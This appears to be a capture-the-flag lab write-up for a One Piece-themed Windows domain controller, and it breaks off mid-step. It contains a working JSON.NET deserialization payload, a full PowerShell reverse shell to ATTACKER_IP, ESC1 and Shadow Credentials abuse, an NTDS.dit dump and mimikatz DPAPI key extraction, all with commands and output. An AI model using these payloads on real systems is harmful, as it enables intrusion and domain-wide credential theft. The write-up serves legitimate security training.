---
title: "Going Merry"
platform: "Ludus"
category: "Windows"
difficulty: "Hard"
date: 2026-02-08
os: "Windows Server 2022"
active: true
hash_required: true
unlock_password: "REDACTED"
tags: ["windows", "active-directory", "deserialization", "json.net", "mssql", "adcs", "esc1", "shadow-credentials", "backup-operators", "efs", "ntds-dump", "dpapi", "pkinit"]
---

---

## Overview

**Difficulty:** Hard
**Domain:** goingmerry.local
**IP:** `10.13.10.80`

Going Merry is a single-box Windows Server 2022 Domain Controller themed after One Piece. The box runs Active Directory, IIS, MSSQL, and AD CS with a 6-stage attack chain spanning insecure deserialization to EFS-encrypted root flag recovery via DPAPI. Multiple rabbit holes (ASREPRoastable, Kerberoastable, disabled accounts) test the attacker's ability to distinguish real attack paths from noise.

---

## Scope

```
Host              IP Address      Operating System           Role
─────────────────────────────────────────────────────────────────────────
GOINGMERRY        10.13.10.80     Windows Server 2022        Domain Controller
```

---

## Executive Summary

The engagement identified critical vulnerabilities across multiple services:

- **Insecure JSON Deserialization** in IIS web application (Newtonsoft.Json `TypeNameHandling.All`) leading to RCE
- **Cleartext MSSQL Credentials** in `web.config` enabling database access as domain user
- **ADCS ESC1** via misconfigured certificate template allowing arbitrary user impersonation
- **GenericWrite ACL** enabling Shadow Credentials attack for lateral movement
- **Backup Operators** group membership enabling NTDS.dit extraction via SeBackupPrivilege
- **EFS-encrypted root flag** requiring DPAPI backup key extraction for final decryption

**Risk Rating:** Critical

---

## Enumeration

### Nmap Scan

```bash
nmap -sCV 10.13.10.80 -Pn
```

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 21:00 EST
Nmap scan report for 10.13.10.80
Host is up (0.015s latency).
Not shown: 983 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Grand Line Crew Management Portal
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: goingmerry.local0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: GOINGMERRY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

Key observations:
- **Port 80/443** — IIS web application ("Grand Line Crew Management Portal")
- **Port 88** — Kerberos (Active Directory)
- **Port 1433** — MSSQL
- **Port 5985** — WinRM (potential remote access)
- **SMB signing required** — relay attacks blocked

### Web Application Enumeration

Browsing to port 80 reveals the "Grand Line Crew Management Portal" — a themed ASP.NET application for the Straw Hat Pirates crew.

The main page displays crew member cards with usernames, emails, and roles. The navigation includes links to:
- **Home** — Main dashboard with crew overview
- **Crew** — Detailed crew roster
- **Devil Fruit DB** — API-backed database lookup
- **Contact** — Directory with all personnel

### Username Enumeration

The crew page exposes domain usernames and email format `username@goingmerry.local`:

```
Username        Full Name           Role                    Email
────────────────────────────────────────────────────────────────────────────
m.luffy         Monkey D. Luffy     Captain                 m.luffy@goingmerry.local
r.zoro          Roronoa Zoro        First Mate / Swordsman  r.zoro@goingmerry.local
nami            Nami                Navigator               nami@goingmerry.local
usopp           Usopp               Sniper / Recon          usopp@goingmerry.local
s.vinsmoke      Sanji Vinsmoke      Chef / Logistics        s.vinsmoke@goingmerry.local
t.chopper       Tony Tony Chopper   Doctor / Medical        t.chopper@goingmerry.local
n.robin         Nico Robin          Archaeologist           n.robin@goingmerry.local
c.flam          Franky              Shipwright / Engineer   c.flam@goingmerry.local
brook           Brook               Musician                brook@goingmerry.local
jinbe           Jinbe               Helmsman                jinbe@goingmerry.local
svc_web         -                   Web Portal Service      svc_web@goingmerry.local
```

The contact page also mentions the `svc_web` service account used to run the portal.

### Validating Usernames via Kerberos

```bash
kerbrute userenum users.txt --dc 10.13.10.80 -d goingmerry.local
```

```
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3

2026/02/07 21:05:01 >  [+] VALID USERNAME:       m.luffy@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       r.zoro@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       nami@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       usopp@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       s.vinsmoke@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       t.chopper@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       n.robin@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       c.flam@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       brook@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       jinbe@goingmerry.local
2026/02/07 21:05:01 >  [+] VALID USERNAME:       svc_web@goingmerry.local
2026/02/07 21:05:01 >  Done! 11/11 valid usernames found
```

All 11 usernames confirmed valid.

### Devil Fruit API Discovery

The Devil Fruit DB page links to an API endpoint. Sending a GET request to discover the API:

```bash
curl -s http://10.13.10.80/api/devilfruit | jq .
```

```json
{
  "status": "ok",
  "message": "Devil Fruit Database API v2.1",
  "usage": "POST JSON with {\"name\": \"fruit name\"} to search",
  "total_fruits": 8,
  "serializer": "Newtonsoft.Json"
}
```

The API openly advertises **Newtonsoft.Json** as its serializer. Testing a normal search:

```bash
curl -s -X POST http://10.13.10.80/api/devilfruit \
  -H 'Content-Type: application/json' \
  -d '{"name": "Gomu Gomu no Mi"}' | jq .
```

```json
{
  "Name": "Gomu Gomu no Mi",
  "Type": "Paramecia",
  "Description": "Grants the user a rubber body, making them immune to blunt attacks, bullets, and electricity.",
  "User": "Monkey D. Luffy",
  "Status": "Active"
}
```

---

## Initial Access — IIS Deserialization

### Discovering TypeNameHandling

Sending malformed JSON to trigger error handling reveals the Newtonsoft.Json stack trace:

```bash
curl -s -X POST http://10.13.10.80/api/devilfruit \
  -H 'Content-Type: application/json' \
  -d '{"$type":"invalid"}' | jq .
```

```json
{
  "error": "Newtonsoft.Json.JsonSerializationException",
  "message": "Error resolving type specified in JSON 'invalid'. Path '$type', line 1, position 19.",
  "stack": "   at Newtonsoft.Json.Serialization.JsonSerializerInternalReader.ResolveTypeName..."
}
```

The `$type` field is being processed — this confirms **TypeNameHandling** is enabled. Combined with Newtonsoft.Json 13.0.0 (vulnerable to gadget chains), this is an insecure deserialization vulnerability.

### Crafting the Payload

Using `ysoserial.net` with the `ObjectDataProvider` gadget to generate a Newtonsoft.Json deserialization payload. First, creating a PowerShell reverse shell:

```bash
# Generate base64-encoded PowerShell reverse shell
RHOST="ATTACKER_IP"
RPORT="443"
REV_SHELL='$c=New-Object Net.Sockets.TCPClient("'$RHOST'",'$RPORT');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
B64=$(echo -n "$REV_SHELL" | iconv -t UTF-16LE | base64 -w0)
echo $B64
```

Then crafting the JSON payload:

```bash
cat > payload.json << 'PAYLOAD'
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": [
            "cmd.exe",
            "/c powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC..."
        ]
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    }
}
PAYLOAD
```

### Obtaining a Reverse Shell

Starting the listener:

```bash
rlwrap nc -lvnp 443
```

Sending the deserialization payload:

```bash
curl -X POST http://10.13.10.80/api/devilfruit \
  -H 'Content-Type: application/json' \
  -d @payload.json
```

```
listening on [any] 443 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.13.10.80] 49871

PS C:\windows\system32\inetsrv> whoami
goingmerry\svc_web

PS C:\windows\system32\inetsrv> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We have a shell as `svc_web`. Notably, **SeImpersonatePrivilege is NOT present** — the IIS app pool runs as a custom domain user, not a virtual account. Potato-style attacks won't work here.

---

## Lateral Movement — web.config to MSSQL

### Reading web.config

As `svc_web`, we can read the IIS configuration:

```powershell
type C:\inetpub\wwwroot\web.config
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <connectionStrings>
    <!-- Treasure Management Database - Navigator Division -->
    <add name="TreasureDB"
         connectionString="Server=localhost;Database=master;User Id=nami;Password=[REDACTED];"
         providerName="System.Data.SqlClient" />
  </connectionStrings>
  <system.web>
    <compilation debug="true" targetFramework="4.8">
      <assemblies>
        <add assembly="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed" />
      </assemblies>
    </compilation>
    ...
  </system.web>
</configuration>
```

MSSQL credentials discovered: **nami** / **[REDACTED]**

### Connecting to MSSQL

```bash
impacket-mssqlclient 'GOINGMERRY.LOCAL/nami:[REDACTED]@10.13.10.80'
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16384
[*] INFO(GOINGMERRY): Line 1: Changed database context to 'master'.
[*] INFO(GOINGMERRY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 00)
[!] Press help for extra shell commands
SQL (GOINGMERRY\nami  dbo@master)>
```

### Checking Privileges and Enabling xp_cmdshell

```sql
SQL (GOINGMERRY\nami  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
```

```
-----------
          1
```

`nami` has **sysadmin** on the SQL instance. Enabling command execution:

```sql
SQL (GOINGMERRY\nami  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL (GOINGMERRY\nami  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```
[*] INFO(GOINGMERRY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(GOINGMERRY): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

### Getting a Shell as nami

```sql
SQL (GOINGMERRY\nami  dbo@master)> xp_cmdshell whoami
```

```
output
----------------
goingmerry\nami
NULL
```

Using xp_cmdshell to download and execute a reverse shell:

```sql
SQL (GOINGMERRY\nami  dbo@master)> xp_cmdshell powershell -enc JABjAD0ATgBlAHcALQBPAGIA...
```

On the listener:

```
listening on [any] 9001 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.13.10.80] 49903

PS C:\Windows\system32> whoami
goingmerry\nami
```

### User Flag

```powershell
PS C:\Windows\system32> type C:\Users\nami\Desktop\user.txt
GM{th3_n4v1g4t0r_ch4rt3d_th3_c0urs3}
```

---

## Active Directory Enumeration

### BloodHound Collection

Using `bloodhound-python` to collect AD data from the attacker box:

```bash
bloodhound-python -u 'nami' -p '[REDACTED]' -d goingmerry.local -ns 10.13.10.80 -c all
```

```
INFO: Found AD domain: goingmerry.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: GOINGMERRY.goingmerry.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: GOINGMERRY.goingmerry.local
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: GOINGMERRY.goingmerry.local
INFO: Done in 00M 08S
```

### Key BloodHound Findings

After importing into BloodHound, the following attack paths are identified:

1. **r.zoro → GenericWrite → s.vinsmoke** — r.zoro can modify s.vinsmoke's attributes
2. **s.vinsmoke** is a member of **Backup Operators** — has SeBackupPrivilege
3. **m.luffy** is a member of **Domain Admins** — final target

### Rabbit Holes Identified

**ASREPRoastable account:**

```bash
impacket-GetNPUsers goingmerry.local/ -dc-ip 10.13.10.80 -usersfile users.txt -format hashcat
```

```
$krb5asrep$23$t.chopper@GOINGMERRY.LOCAL:[HASH REDACTED]
```

`t.chopper` is ASREPRoastable — but the password is 30+ random characters. Hashcat won't crack it with any wordlist.

**Kerberoastable account:**

```bash
impacket-GetUserSPNs goingmerry.local/nami:'[REDACTED]' -dc-ip 10.13.10.80
```

```
ServicePrincipalName    Name     MemberOf  PasswordLastSet             LastLogon
──────────────────────  ───────  ────────  ──────────────────────────  ─────────
HTTP/goingmerry.local   usopp             2026-01-15 10:30:22.000000  <never>
```

`usopp` has an SPN (Kerberoastable) — but the password is also 30+ random characters. Another dead end.

**Other dead ends:**
- `brook` — account is **disabled** (can't authenticate)
- `n.robin` — description mentions "Poneglyph Research Archive" at `\\GOINGMERRY\Poneglyphs` but the share only contains flavor text files about ancient history
- `c.flam` — runs a scheduled task but has no useful privileges

---

## ADCS Abuse — ESC1

### Enumerating Certificate Templates

```bash
certipy find -u 'nami@goingmerry.local' -p '[REDACTED]' -dc-ip 10.13.10.80 -ldap-scheme ldap -vulnerable -stdout
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'GOINGMERRY-CA' via CSRA
[*] Got CA configuration for 'GOINGMERRY-CA'
[*] Enumeration output:

Certificate Authorities
  0
    CA Name                             : GOINGMERRY-CA
    DNS Name                            : GOINGMERRY.goingmerry.local
    Certificate Subject                 : CN=GOINGMERRY-CA, DC=goingmerry, DC=local
    Certificate Serial Number           : 1A2B3C4D5E6F7A8B9C0D1E2F3A4B5C6D
    Certificate Validity Start          : 2026-01-10 00:00:00+00:00
    Certificate Validity End            : 2031-01-10 00:00:00+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled

Certificate Templates
  0
    Template Name                       : StrawHatAuth
    Display Name                        : Straw Hat Authentication
    Certificate Authorities             : GOINGMERRY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  :
        Client Authentication
        Secure Email
        Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : GOINGMERRY.LOCAL\Domain Users
      Object Control Permissions
        Owner                           : GOINGMERRY.LOCAL\Administrator
        Write Owner Principals          : GOINGMERRY.LOCAL\Domain Admins
        Write Dacl Principals           : GOINGMERRY.LOCAL\Domain Admins
        Write Property Principals       : GOINGMERRY.LOCAL\Domain Admins
    [!] Vulnerabilities
      ESC1                              : 'GOINGMERRY.LOCAL\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

The **StrawHatAuth** template is vulnerable to **ESC1**:
- **Domain Users** can enroll (we have nami)
- **ENROLLEE_SUPPLIES_SUBJECT** is enabled (we can specify any SAN)
- **Client Authentication** EKU is present (cert can be used for Kerberos auth)

### Requesting Certificate as r.zoro

```bash
certipy req -u 'nami@goingmerry.local' -p '[REDACTED]' \
  -dc-ip 10.13.10.80 -ca GOINGMERRY-CA -template StrawHatAuth \
  -upn r.zoro@goingmerry.local -ldap-scheme ldap
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'r.zoro@goingmerry.local'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'r.zoro.pfx'
```

### Authenticating via PKINIT

```bash
certipy auth -pfx r.zoro.pfx -dc-ip 10.13.10.80
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: r.zoro@goingmerry.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'r.zoro.ccache'
[*] Trying to retrieve NT hash for 'r.zoro'
[*] Got hash for 'r.zoro@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]
```

We now have `r.zoro`'s NT hash: **`[HASH REDACTED]`**

---

## Shadow Credentials — r.zoro to s.vinsmoke

### Confirming the GenericWrite ACL

BloodHound showed that `r.zoro` has **GenericWrite** on `s.vinsmoke`. We can verify with nxc:

```bash
nxc ldap 10.13.10.80 -u r.zoro -H '[HASH REDACTED]' \
  -d goingmerry.local -M daclread -o TARGET=s.vinsmoke ACTION=read
```

```
SMB  10.13.10.80  445  GOINGMERRY  [*] Windows Server 2022 Build 20348 x64 (name:GOINGMERRY) (domain:goingmerry.local) (signing:True) (SMBv1:False)
LDAP 10.13.10.80  389  GOINGMERRY  [+] goingmerry.local\r.zoro:[HASH REDACTED]
LDAP 10.13.10.80  389  GOINGMERRY  [*] Found ACE for r.zoro on s.vinsmoke:
LDAP 10.13.10.80  389  GOINGMERRY  [*]   ACE Type: ACCESS_ALLOWED_ACE
LDAP 10.13.10.80  389  GOINGMERRY  [*]   Access Mask: GenericWrite
```

### Exploiting Shadow Credentials

GenericWrite allows writing the `msDS-KeyCredentialLink` attribute on `s.vinsmoke`, enabling a Shadow Credentials attack:

```bash
certipy shadow auto -u 'r.zoro@goingmerry.local' \
  -hashes ':[HASH REDACTED]' \
  -account s.vinsmoke -dc-ip 10.13.10.80 -ldap-scheme ldap
```

```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 's.vinsmoke'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '42a1b3c4-e5f6-7890-abcd-ef0123456789'
[*] Adding Key Credential with device ID '42a1b3c4-e5f6-7890-abcd-ef0123456789' to the Key Credentials for 's.vinsmoke'
[*] Successfully added Key Credential
[*] Authenticating as 's.vinsmoke' with the certificate
[*] Using principal: s.vinsmoke@goingmerry.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 's.vinsmoke.ccache'
[*] Trying to retrieve NT hash for 's.vinsmoke'
[*] Got hash for 's.vinsmoke@goingmerry.local': aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]
```

We now have `s.vinsmoke`'s NT hash: **`[HASH REDACTED]`**

### Confirming Backup Operators Membership

```bash
nxc smb 10.13.10.80 -u s.vinsmoke -H '[HASH REDACTED]' -d goingmerry.local
```

```
SMB  10.13.10.80  445  GOINGMERRY  [*] Windows Server 2022 Build 20348 x64 (name:GOINGMERRY) (domain:goingmerry.local) (signing:True) (SMBv1:False)
SMB  10.13.10.80  445  GOINGMERRY  [+] goingmerry.local\s.vinsmoke:[HASH REDACTED]
```

Connecting via WinRM to check privileges:

```bash
evil-winrm -i 10.13.10.80 -u s.vinsmoke -H '[HASH REDACTED]'
```

```
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> whoami /groups | findstr -i "backup"
BUILTIN\Backup Operators                  Alias  S-1-5-32-551 Group used for deny only

*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`s.vinsmoke` has **SeBackupPrivilege** — we can read any file on the system including NTDS.dit.

---

## Privilege Escalation — NTDS Dump

### Enabling SeBackupPrivilege

The privilege shows "Disabled" but can be enabled in-process. We'll use DiskShadow and robocopy which automatically leverage backup privileges.

### Creating a Shadow Copy via DiskShadow

First, upload a DiskShadow script:

```powershell
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> echo @"
set context persistent nowriters
add volume c: alias goingmerry
create
expose %goingmerry% z:
"@ > C:\temp\shadow.txt
```

Execute DiskShadow:

```powershell
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> diskshadow.exe /s C:\temp\shadow.txt
```

```
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation

-> set context persistent nowriters
-> add volume c: alias goingmerry
-> create
Alias goingmerry for shadow ID {a1234b56-c789-0def-1234-567890abcdef} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {d9876e54-f321-0abc-def0-123456789abc} set as environment variable.

Number of shadow copies listed: 1
-> expose %goingmerry% z:
-> %goingmerry% = {a1234b56-c789-0def-1234-567890abcdef}
The shadow copy was successfully exposed as z:\.
```

### Extracting NTDS.dit

```powershell
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> robocopy /B z:\Windows\NTDS C:\temp ntds.dit
```

```
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, February 8, 2026 2:15:00 AM
   Source : z:\Windows\NTDS\
     Dest : C:\temp\

    Files : ntds.dit

                           1    z:\Windows\NTDS\
            New File              64.0 m        ntds.dit
  100%

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :  64.00 m   64.00 m         0         0         0         0
```

### Saving Registry Hives

```powershell
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> reg save HKLM\SYSTEM C:\temp\system.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> reg save HKLM\SECURITY C:\temp\security.hive
The operation completed successfully.
```

### Downloading Files

```powershell
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> download C:\temp\ntds.dit
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> download C:\temp\system.hive
*Evil-WinRM* PS C:\Users\s.vinsmoke\Documents> download C:\temp\security.hive
```

### Dumping Domain Hashes

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive -security security.hive LOCAL
```

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: [HASH REDACTED]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList value using given bootkey
[*] PEK # 0 found and decrypted
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
m.luffy:1103:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
r.zoro:1104:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
nami:1105:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
usopp:1106:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
s.vinsmoke:1107:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
t.chopper:1108:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
n.robin:1109:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
c.flam:1110:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
brook:1111:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
jinbe:1112:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
svc_web:1113:aad3b435b51404eeaad3b435b51404ee:[HASH REDACTED]:::
[*] Kerberos keys grabbed
[*] Cleaning up...
```

Domain Admin hash obtained: **m.luffy** : `[HASH REDACTED]`

---

## Root Flag — EFS Decryption

### Connecting as Domain Admin

```bash
evil-winrm -i 10.13.10.80 -u m.luffy -H '[HASH REDACTED]'
```

```
*Evil-WinRM* PS C:\Users\m.luffy\Documents> whoami
goingmerry\m.luffy

*Evil-WinRM* PS C:\Users\m.luffy\Documents> net user m.luffy /domain | findstr -i "group"
Local Group Memberships
Global Group memberships     *Domain Admins        *Domain Users
                             *Straw Hats
```

### Discovering EFS Encryption

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> type C:\Users\m.luffy\Desktop\root.txt
```

The file contents appear as garbled/encrypted data — the file is EFS-encrypted.

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> cipher /c C:\Users\m.luffy\Desktop\root.txt
```

```
 Listing C:\Users\m.luffy\Desktop\
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

  Users who can decrypt:
    GOINGMERRY\m.luffy [m.luffy(m.luffy@goingmerry.local)]
    Certificate thumbprint: A1B2 C3D4 E5F6 7890 ABCD EF01 2345 6789 ABCD EF01

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

The file is encrypted with `m.luffy`'s EFS certificate. Since evil-winrm uses network logon (Type 3), the user's DPAPI master keys aren't cached — the EFS private key can't be loaded. We need to extract it manually.

### DPAPI Backup Key Extraction

Upload mimikatz to the DC:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> upload /opt/tools/mimikatz/x64/mimikatz.exe C:\temp\mimikatz.exe
```

Extract the domain DPAPI backup key (requires DA privileges):

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "privilege::debug" "lsadump::backupkeys /system:goingmerry.local /export" "exit"
```

```
  .#####.   mimikatz 2.2.0 (x64) #19041
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi`
 ## \ / ##       > https://blog.gentilkiwi.com
 '## v ##'
  '#####'

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::backupkeys /system:goingmerry.local /export

Current prefered key:       {a1b2c3d4-e5f6-7890-abcd-ef0123456789}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        pvk file: ntds_capi_0_a1b2c3d4-e5f6-7890-abcd-ef0123456789.pvk
        der file: ntds_capi_0_a1b2c3d4-e5f6-7890-abcd-ef0123456789.der

Compatibility prefered key:  {f9e8d7c6-b5a4-3210-fedc-ba9876543210}
  * Legacy key
        pvk file: ntds_legacy_0_f9e8d7c6-b5a4-3210-fedc-ba9876543210.pvk

mimikatz(commandline) # exit
```

### Decrypting m.luffy's DPAPI Master Key

Find m.luffy's DPAPI master key file:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> dir C:\Users\m.luffy\AppData\Roaming\Microsoft\Protect\S-1-5-21-*
```

```
    Directory: C:\Users\m.luffy\AppData\Roaming\Microsoft\Protect\S-1-5-21-2847392816-1295834720-3948571062-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         1/15/2026  10:30 AM            740 d5f92b4a-1c3e-4f87-9a6b-2d8e0f5c3a17
-a-hs-         1/15/2026  10:30 AM             24 Preferred
```

Decrypt the master key using the backup PVK:

```powershell
*Evil-WinRM* PS C:\Users\m.luffy\Documents> C:\temp\mimikatz.exe "dpapi::masterkey /in:C:\Users\m.luffy\AppData\Roaming\Microsoft\Protect\S-1-5-21-2847392816-1295834720-3948571062-1103\d5f92b4a-1c3e-4f87-9a6b-2d8e0f5c3a17 /pvk:C:\temp\ntds_capi_0_a1b2c3d4-e5f6-7890-abcd-ef0123456789.pvk" "exit"
```

```
mimikatz(commandline) # dpapi::masterkey /in:... /pvk:...

[domainkey] with RSA private key

[masterkey] with DPAPI_SYSTEM (machine, then user)
** MASTERKEY **
    [HASH REDACTED]

  key : [HASH REDACTED]
  sha1: [HASH REDACTED]

mimikatz(commandline) # exit
```

### Decrypting the EFS Private Key

Find m.luffy's EFS RSA key container:

```powershell
